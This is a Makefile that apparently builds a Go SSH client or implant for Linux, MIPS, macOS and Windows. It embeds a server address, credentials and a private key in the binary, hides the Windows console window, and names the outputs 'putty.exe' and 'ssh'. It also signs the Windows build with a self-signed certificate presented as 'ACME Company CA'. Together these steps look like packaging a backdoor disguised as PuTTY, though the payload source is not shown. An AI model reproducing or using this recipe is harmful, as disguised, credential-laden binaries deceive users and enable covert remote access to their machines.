BUILD=go build
OUT_LINUX=./bin/ssh
OUT_WIN=./bin/putty_unsigned.exe
SIGNED_WIN_OUT=./bin/putty.exe
WIN_RESOURCE=./resource.syso
WIN_SRC=.
NIC_SRC=*.go
PATH_TO_PEM=~/.ssh/test.pem
PEM_FILE=$(shell cat ${PATH_TO_PEM} | base64)
SRV_KEY=server.key
SRV_PEM=server.pem
LINUX_LDFLAGS=--trimpath --ldflags "-s -w -X main.pemAuth=${PEM} -X main.pemFile=${PEM_FILE} -X main.servUser=${USER} -X main.sshServer=${SERVER} -X main.servPasswd=${PASSWD}" 
WIN_LDFLAGS=--trimpath --ldflags "-s -w -X main.pemAuth=${PEM} -X main.pemFile=${PEM_FILE} -X main.servUser=${USER} -X main.sshServer=${SERVER} -X main.servPasswd=${PASSWD} -H=windowsgui"

depends:
	openssl req -subj '/emailAddress=abuse@acme.com/CN=ACME Company CA/O=ACME Company/C=US' -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}

linux32:
	GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}

linux64:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}

mips:
	GOOS=linux GOARCH=mips ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}

macos64:
	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${NIC_SRC}

windows64:
	goversioninfo -icon=./resource/icon.ico ./resource/verioninfo.json
	GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WIN} ${WIN_SRC}
	osslsigncode sign -certs server.pem -key server.key -i http://www.acme.com -in ${OUT_WIN} -out ${SIGNED_WIN_OUT}
	osslsigncode verify ${SIGNED_WIN_OUT}

windows32:
	goversioninfo -icon=./resource/icon.ico ./resource/verioninfo.json
	GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WIN} ${WIN_SRC}
	osslsigncode sign -certs server.pem -key server.key -i http://www.acme.com -in ${OUT_WIN} -out ${SIGNED_WIN_OUT}
	osslsigncode verify ${SIGNED_WIN_OUT}

clean:
	rm -f ${OUT_LINUX} ${OUT_WIN} ${WIN_RESOURCE} ${SIGNED_WIN_OUT} ${WIN_RESOURCE}
